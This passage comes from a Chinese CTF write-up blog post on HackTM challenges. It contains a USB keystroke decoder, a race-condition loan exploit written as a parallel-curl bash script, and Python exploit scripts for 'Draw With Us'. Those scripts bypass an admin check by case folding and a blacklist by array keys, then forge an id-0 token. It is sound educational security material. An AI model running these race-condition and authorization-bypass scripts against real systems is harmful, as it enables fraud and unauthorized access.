class="string">"17"</span>:<span class="string">"T"</span>,</span><br><span class="line">        <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>,</span><br><span class="line">         <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>,</span><br><span class="line">          <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,</span><br><span class="line">          <span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,</span><br><span class="line">          <span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,</span><br><span class="line">          <span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,</span><br><span class="line">          <span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,</span><br><span class="line">          <span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">'2'</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">"00"</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">'2'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">'[unknown]'</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">print(<span class="string">""</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">'&lt;DEL&gt;'</span>)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">"&lt;CAP&gt;"</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'output :'</span> + <span class="string">""</span>.join(output))</span><br></pre></td></tr></table></figure>

<p>这里再拓展一下，usb流量一般是<code>鼠标流量</code>或者是<code>键盘流量</code>，可以参考<a href="https://www.cnblogs.com/hackxf/p/10670844.html">这里</a>。<br>提供一位师傅的<a href="https://github.com/WangYihang/UsbMiceDataHacker">工具</a>。</p>
<h3 id="My-Bank"><a href="#My-Bank" class="headerlink" title="My Bank"></a>My Bank</h3><p>一道web的条件竞争题目</p>
<h4 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h4><p>常见的一种题，可以去银行贷款，不过最多贷款600刀，还能去商店买东西，饼干最便宜，但是没法吃，还是买flag吧，但是要1440刀…<br>分析可知，可以利用条件竞争进行贷款，这样就可以拿到不止600刀的资金，再去买flag即可。<br>条件竞争可参考：<a href="https://blog.csdn.net/qq_36992198/article/details/80007405">https://blog.csdn.net/qq_36992198/article/details/80007405</a></p>
<h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>1、利用BP解题</p>
<ul>
<li>抓包</li>
<li>放到爆破模块，设置空payload，线程设为15</li>
<li>借到足够的钱去买flag</li>
</ul>
<p>首先注册账号并登陆，看一下我们的账户信息：<br><img src="http://www.ggb0n.cool/images/HackTM-WP3.png" alt=""><br>可以看到，我们还可以借600刀，然后设置借钱为100，BP抓包进行爆破，用13-15个线程即可，结果如下：<br><img src="http://www.ggb0n.cool/images/HackTM-WP4.png" alt=""><br>然后回到我们的账户处查看利用条件竞争借到的1000刀已经到账:<br><img src="http://www.ggb0n.cool/images/HackTM-WP5.png" alt=""><br>这里需要多次尝试才能借到足够的钱数，每次结果都可能是不一样的。因为利用BP进行条件竞争的时候有时候会受到网速、服务质量等各种因素的影响，多试几次就好了。</p>
<p>2、BASH脚本<br>看国外大佬的解题思路学到了一种利用bash脚本进行条件竞争的方式(其实用python也一样)，脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">url=<span class="string">"http://178.128.175.6:50090/"</span></span><br><span class="line">ua=<span class="string">"User-Agent: Mozilla/5.0"</span></span><br><span class="line">cookie=<span class="string">"session=.eJwNy0sKAjEMANC7ZG1hmmTy8TLStAmIoKDOSry7vv37wHw96_J-3PIOZwhCNNlimhOPlTor3IYOWjkijbOHFBac4Diu6z-Ute9SvWGZNaaNm3tko4mdQnRXF_j-AEMAHN8.Xjaggw.o-B9vO_i0Fnredto0K7aoEXTCGI"</span></span><br><span class="line">ssrf=`curl -s <span class="string">"<span class="variable">$url</span>"</span> -H <span class="string">"<span class="variable">$ua</span>"</span> -H <span class="string">"Cookie: <span class="variable">$cookie</span>"</span> 2&gt;&amp;1 | pcregrep -o1 <span class="string">'name=\"csrf_token\" type=\"hidden\" value=\"(.*)\"'</span> -`</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 15`; </span><br><span class="line">    <span class="keyword">do</span> curl <span class="string">"<span class="variable">$url</span>"</span> -H <span class="string">"<span class="variable">$ua</span>"</span> -H <span class="string">"Cookie: <span class="variable">$cookie</span>"</span> --data <span class="string">"csrf_token=<span class="variable">$ssrf</span>&amp;loan=100"</span> &amp;</span><br><span class="line">; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">sleep 6 &amp;&amp; <span class="built_in">echo</span> <span class="string">"[*] maybe haxed?"</span> &amp;&amp; curl -s <span class="string">'http://178.128.175.6:50090/'</span> -H <span class="string">"<span class="variable">$ua</span>"</span> -H <span class="string">"Cookie: <span class="variable">$cookie</span>"</span> 2&gt;&amp;1 | pcregrep -o1 <span class="string">"Money: (.*) tBTC"</span></span><br></pre></td></tr></table></figure>
<p>这里利用了一个技巧：在<code>cURL</code>命令之后附加一个<code>&amp;</code>使进程移到后台。这样，可以同时发出多个请求，并且不需要编写一个处理多线程的复杂代码。</p>
<h3 id="Draw-With-Us"><a href="#Draw-With-Us" class="headerlink" title="Draw With Us"></a>Draw With Us</h3><p>一个<code>JWT</code>攻击题目，进入题目是下图的一个改颜色的web端游戏，给出Hint：<code>Changing your color is the first step towards happiness.</code><br><img src="http://www.ggb0n.cool/images/HackTM-WP6.png" alt=""><br>同时题目还给了一个json附件，实现代码都在其中，其中包含关键部分：</p>
<ul>
<li>NodeJS Express服务器</li>
<li>登录/管理员管理/socket.io</li>
<li>JWT算法：<code>HMAC-SHA256</code></li>
<li>管理员用户名：<code>hacktm</code></li>
</ul>
<h4 id="题目分析-amp-一些攻击尝试"><a href="#题目分析-amp-一些攻击尝试" class="headerlink" title="题目分析&amp;一些攻击尝试"></a>题目分析&amp;一些攻击尝试</h4><h5 id="破解JWT秘钥"><a href="#破解JWT秘钥" class="headerlink" title="破解JWT秘钥"></a>破解JWT秘钥</h5><p>代码中获取flag的函数如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">app.get("/flag", (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Get the flag</span></span><br><span class="line">  <span class="comment">// Only for root</span></span><br><span class="line">  if (req.user.id == 0) &#123;</span><br><span class="line">    res.send(ok(&#123; flag: flag &#125;));</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    res.send(err("Unauthorized"));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>想要得到flag，就必须满足<code>req.user.id == 0</code>，那么就需要想办法构造JWT。看国外大佬的WP写的对JWT秘钥进行攻击，但是没有成功。</p>
<h5 id="暴力破解n"><a href="#暴力破解n" class="headerlink" title="暴力破解n"></a>暴力破解n</h5><p>下面这段代码给出了<code>req.user.id</code>的生成算法：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">app.post("/init", (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Initialize new round and sign admin token</span></span><br><span class="line">  <span class="comment">// RSA protected!</span></span><br><span class="line">  <span class="comment">// POST</span></span><br><span class="line">  <span class="comment">// &#123;</span></span><br><span class="line">  <span class="comment">//   p:"0",</span></span><br><span class="line">  <span class="comment">//   q:"0"</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">  let &#123; p = "0", q = "0", clearPIN &#125; = req.body;</span><br><span class="line"></span><br><span class="line">  let target = md5(config.n.toString());</span><br><span class="line"></span><br><span class="line">  let pwHash = md5(</span><br><span class="line">    bigInt(String(p))</span><br><span class="line">      .multiply(String(q))</span><br><span class="line">      .toString()</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  if (pwHash == target &amp;&amp; clearPIN === _clearPIN) &#123;</span><br><span class="line">    <span class="comment">// Clear the board</span></span><br><span class="line">    board = new Array(config.height)</span><br><span class="line">      .fill(0)</span><br><span class="line">      .map(() =&gt; new Array(config.width).fill(config.backgroundColor));</span><br><span class="line">    boardString = boardToStrings();</span><br><span class="line"></span><br><span class="line">    io.emit("board", &#123; board: boardString &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Sign the admin ID</span></span><br><span class="line">  let adminId = pwHash</span><br><span class="line">    .split("")</span><br><span class="line">    .map((c, i) =&gt; c.charCodeAt(0) ^ target.charCodeAt(i))</span><br><span class="line">    .reduce((a, b) =&gt; a + b);</span><br><span class="line"></span><br><span class="line">  console.log(adminId);</span><br><span class="line"></span><br><span class="line">  res.json(ok(&#123; token: sign(&#123; id: adminId &#125;) &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>代码中的<code>p</code>和<code>q</code>是用户输入，<code>n</code>是秘钥。由于md5的结果为32个字符，且<code>target</code>长度与<code>pwHash</code>相同，同时<code>toString</code>暗示<code>n</code>是数字。<br><code>adminId</code>是利用<code>target</code>计算的，每个字符都经过了<code>XOR</code>运算。在<code>map()</code>的迭代中，两个字符相同的结果即为0，最后通过<code>reduce()</code>会计算出所有数的结果，若0，则<code>req.user.id==0</code>。<br>然而，如果哈希值不匹配的话，<code>req.user.id</code>就会是一个大于<code>0</code>的数字。<br>由于<code>reduce()</code>消除线性搜索推导的可能性，因此无法现实地对此进行暴力破解<code>n</code>，必须找到另一种方式。</p>
<h5 id="JWT-none-攻击"><a href="#JWT-none-攻击" class="headerlink" title="JWT none 攻击"></a>JWT none 攻击</h5><p>这种攻击方法可参考：<a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</a></p>
<ul>
<li>1、替换或者更改JWT有效负载</li>
<li>2、更改<code>id</code>，如<code>{&quot;id&quot;:1374,&quot;iat&quot;:1580560256}</code> -&gt; <code>{&quot;id&quot;:0,&quot;iat&quot;:1580560256}</code></li>
<li>3、删除签名</li>
<li>4、更改<code>{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}</code>-&gt;<code>&quot;alg&quot;: &quot;none&quot;</code></li>
<li>5、提交服务器<br>但是该方法也不行。</li>
</ul>
<p>总之，关键点就在于：</p>
<ul>
<li>1、使<code>req.user.id==0</code></li>
<li>2、为了实现1需要得到<code>config.n</code></li>
<li>3、可能有其他方式得到<code>config.n</code>或者<code>config.p</code></li>
</ul>
<p>从下面一段代码可以得到新的思路：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">app.get("/serverInfo", (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Get server info</span></span><br><span class="line">  <span class="comment">// Only for logged in users</span></span><br><span class="line"></span><br><span class="line">  let user = users[req.user.id] || &#123; rights: [] &#125;;</span><br><span class="line">  let info = user.rights.map(i =&gt; (&#123; name: i, value: config[i] &#125;));</span><br><span class="line">  res.json(ok(&#123; info: info &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>应该是利用<code>user.rights</code>作为访问key直接读取对象的代码，如果可以插入自己的<code>user.rights</code>，便可以插入<code>n</code>从而得到<code>config.n</code>的值。<br>然后发现另一段更新用户数据的代码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">app.post("/updateUser", (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Update user color and rights</span></span><br><span class="line">  <span class="comment">// Only for admin</span></span><br><span class="line">  <span class="comment">// POST</span></span><br><span class="line">  <span class="comment">// &#123;</span></span><br><span class="line">  <span class="comment">//   color: 0xDEDBEE,</span></span><br><span class="line">  <span class="comment">//   rights: ["height", "width", "usersOnline"]</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  let uid = req.user.id;</span><br><span class="line">  let user = users[uid];</span><br><span class="line">  if (!user || !isAdmin(user)) &#123;</span><br><span class="line">    res.json(err("You're not an admin!"));</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  let color = parseInt(req.body.color);</span><br><span class="line">  users[uid].color = (color || 0x0) &amp; 0xffffff;</span><br><span class="line">  let rights = req.body.rights || [];</span><br><span class="line">  if (rights.length &gt; 0 &amp;&amp; checkRights(rights)) &#123;</span><br><span class="line">    users[uid].rights = user.rights.concat(rights).filter(onlyUnique);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.json(ok(&#123; user: users[uid] &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>但是想要插入<code>rigths</code>必须绕过<code>isAdmin(user)</code>的判断，同时还有<code>isValidUser(user)</code>的判断：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">function isAdmin(u) &#123;</span><br><span class="line">  return u.username.toLowerCase() == config.adminUsername.toLowerCase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isValidUser(u) &#123;</span><br><span class="line">  return (</span><br><span class="line">    u.username.length &gt;= 3 &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以利用下面的方式仿造<code>admin</code>：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">var admin = "hacktm";</span><br><span class="line">var user = "hacKtm";</span><br></pre></td></tr></table></figure>
<p>结果满足条件：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">"hacKtm".toLowerCase() == "hacktm".toLowerCase() // true</span><br><span class="line">"hacKtm".toUpperCase() === "hacktm".toUpperCase() // false</span><br></pre></td></tr></table></figure>
<p>然后即可插入<code>rigths</code>，插入的时候需要经过<code>checkRights(rights)</code>的判断：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">function checkRights(arr) &#123;</span><br><span class="line">  let blacklist = ["p", "n", "port"];</span><br><span class="line">  for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class="line">    const element = arr[i];</span><br><span class="line">    if (blacklist.includes(element)) &#123;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看到，黑名单中限制了<code>p</code>和<code>n</code>的上传，可以通过<strong>利用数组作为键</strong>的方式绕过：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">"rights":[["n"]]</span><br></pre></td></tr></table></figure>
<p>从而即可读取到<code>n</code>，然后通过使<code>p==n</code>，<code>q==1</code>，即可使<code>req.user.id==0</code>，从而拿到<code>flag</code>。</p>
<h4 id="Expoit"><a href="#Expoit" class="headerlink" title="Expoit"></a>Expoit</h4><p>参照大佬脚本：<br>获取<code>n</code>，<code>p</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://167.172.165.153:60001"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create user with the admin username</span></span><br><span class="line">resp = requests.post(url + <span class="string">"/login"</span>,</span><br><span class="line">                     json=&#123;<span class="string">"username"</span>: <span class="string">"hacKtm"</span>&#125;)</span><br><span class="line">resp.raise_for_status()</span><br><span class="line">token = resp.json()[<span class="string">'data'</span>][<span class="string">'token'</span>]</span><br><span class="line">print(<span class="string">"[*] Created user with admin username"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add illegal rights</span></span><br><span class="line">resp = requests.post(url + <span class="string">"/updateUser"</span>,</span><br><span class="line">                     json=&#123;<span class="string">"rights"</span>: [[<span class="string">"n"</span>], [<span class="string">"p"</span>]]&#125;,</span><br><span class="line">                     headers=&#123;<span class="string">"Authorization"</span>: <span class="string">"Bearer %s"</span> % token&#125;)</span><br><span class="line">resp.raise_for_status()</span><br><span class="line">print(<span class="string">"[*] updated rights"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fetch secret config values</span></span><br><span class="line">resp = requests.get(url + <span class="string">"/serverInfo"</span>,</span><br><span class="line">                    headers=&#123;<span class="string">"Authorization"</span>: <span class="string">"Bearer %s"</span> % token&#125;)</span><br><span class="line">resp.raise_for_status()</span><br><span class="line">print(<span class="string">"[*] fetched secret config values"</span>)</span><br><span class="line"></span><br><span class="line">server_info = resp.json()</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> server_info[<span class="string">"data"</span>][<span class="string">"info"</span>]:</span><br><span class="line">    <span class="keyword">if</span> isinstance(key[<span class="string">"name"</span>], list):</span><br><span class="line">        print(<span class="string">"[*] %s = %s"</span> % (key[<span class="string">"name"</span>][<span class="number">0</span>], key[<span class="string">"value"</span>]))</span><br></pre></td></tr></table></figure>
<p>获取<code>flag</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt  <span class="comment"># pip install pyjwt</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"p"</span>: <span class="string">"54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979"</span>,</span><br><span class="line">    <span class="string">"q"</span>: <span class="string">"1"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(url+<span class="string">"/init"</span>, json=data)</span><br><span class="line">token = resp.json()[<span class="string">'data'</span>][<span class="string">'token'</span>]</span><br><span class="line">jwt_claim = jwt.decode(token, verify=<span class="literal">False</span>, algorithms=[<span class="string">'HS256'</span>])</span><br><span class="line"><span class="keyword">assert</span> jwt_claim[<span class="string">'id'</span>] == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">resp = requests.get(url+<span class="string">"/flag"</span>, headers=&#123;<span class="string">"Authorization"</span>: <span class="string">"Bearer %s"</span> % token&#125;)</span><br><span class="line">print(resp.json())</span><br></pre></td></tr></table></figure>
<p>关于<code>node.js</code>的考核可以参考Pcat师傅分享的题解：<a href="https://xz.aliyun.com/t/7177">https://xz.aliyun.com/t/7177</a><br><strong>Bonus！从大佬那拿到了一个画画机器人代码，简单实用！</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  <span class="comment"># pip install pillow-simd requests</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://167.172.165.153:60001"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_color_token</span><span class="params">(_hex)</span>:</span></span><br><span class="line">    resp = requests.post(url+<span class="string">"/login"</span>, json=&#123;<span class="string">"username"</span>: <span class="string">"hacKtm"</span>&#125;)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line">    token = resp.json()[<span class="string">'data'</span>][<span class="string">'token'</span>]</span><br><span class="line">    data = &#123;<span class="string">"color"</span>: int(_hex, <span class="number">16</span>)&#125;</span><br><span class="line"></span><br><span class="line">    resp = requests.post(url+<span class="string">"/updateUser"</span>, json=data, headers=&#123;<span class="string">"Authorization"</span>: <span class="string">"Bearer %s"</span> % token&#125;)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = Image.open(sys.argv[<span class="number">1</span>])</span><br><span class="line">img = img.convert(<span class="string">"RGBA"</span>)</span><br><span class="line">pix = img.load()</span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">"rm output/*"</span>).read()</span><br><span class="line"></span><br><span class="line">output = &#123;&#125;</span><br><span class="line">numcolors = []</span><br><span class="line">hexlookup = &#123;&#125;</span><br><span class="line">data = &#123;&#125;</span><br><span class="line">hexi = <span class="keyword">lambda</span> k: struct.pack(<span class="string">'B'</span>, k).hex()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, img.width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, img.height):</span><br><span class="line">        r, g, b, a = pix[x, y]</span><br><span class="line">        <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        cc = (r, g, b)</span><br><span class="line">        <span class="keyword">if</span> cc <span class="keyword">not</span> <span class="keyword">in</span> numcolors:</span><br><span class="line">            numcolors.append(cc)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        hexlookup.setdefault(cc, <span class="string">f"<span class="subst">&#123;hexi(r)&#125;</span><span class="subst">&#123;hexi(g)&#125;</span><span class="subst">&#123;hexi(b)&#125;</span>"</span>)</span><br><span class="line">        data.setdefault(hexlookup[cc], [])</span><br><span class="line">        data[hexlookup[cc]].append((x, y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> data.items():</span><br><span class="line">    f = open(<span class="string">"output/%s.txt"</span> % k, <span class="string">"a"</span>)</span><br><span class="line">    <span class="keyword">for</span> coord <span class="keyword">in</span> v:</span><br><span class="line">        x, y = coord</span><br><span class="line">        f.write(<span class="string">"%s\n"</span> % json.dumps(&#123;<span class="string">"x"</span>: x, <span class="string">"y"</span>: y&#125;))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> data.items():</span><br><span class="line">    f = open(<span class="string">"output/%s.sh"</span> % k, <span class="string">"a"</span>)</span><br><span class="line">    f.write(<span class="string">"#!/bin/bash\n\n"</span>)</span><br><span class="line"></span><br><span class="line">    token = get_color_token(k)</span><br><span class="line">    cmd = <span class="string">"""curl -vv -XPOST -m3 -s --data "$1" -H "Content-Type: application/json" -H "Authorization: Bearer %s" %s/paint"""</span> % (</span><br><span class="line">        token, url</span><br><span class="line">    )</span><br><span class="line">    f.write(cmd)</span><br><span class="line">    f.write(<span class="string">"\n"</span>)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"parallel -j +10 ./output/%s.sh &lt; output/%s.txt"</span> % (k, k))</span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">"chmod +x output/*.sh"</span>).read()</span><br></pre></td></tr></table></figure>
<p><strong>用法</strong></p>
<ul>
<li>1、该脚本利用题目提供的<code>JSON</code>像素数据获取一个120*80的PNG图像(比如这个题目就给了包含像素数据的JSON)</li>
<li>2、生成像素数据：<code>python main.py &quot;image.png&quot;</code></li>
<li>3、像素数据在<code>output/</code>中</li>
<li>4、该脚本将输出可以运行的GNU并行命令<br>这个题目确实学到了很多。</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>简单的可以做，难的做不出，但是学到很多，继续努力！ヾ(◍°∇°◍)ﾉﾞ</p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">CTF学习记录</a><span> </span><a class="article-more button is-small link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">赛题复现</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted" href="/tags/web/">web</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a><span> </span><a class="article-more button is-small link-muted" href="/tags/Cookie%E6%94%BB%E5%87%BB/">Cookie攻击</a><span> </span><a class="article-more button is-small link-muted" href="/tags/JWT%E4%BC%AA%E9%80%A0/">JWT伪造</a><span> </span><a class="article-more button is-small link-muted" href="/tags/crypto/">crypto</a><span> </span><a class="article-more button is-small link-muted" href="/tags/RSA%E6%94%BB%E5%87%BB/">RSA攻击</a><span> </span><a class="article-more button is-small link-muted" href="/tags/RSA%E9%A2%91%E7%8E%87%E8%A1%A8%E6%94%BB%E5%87%BB/">RSA频率表攻击</a><span> </span><a class="article-more button is-small link-muted" 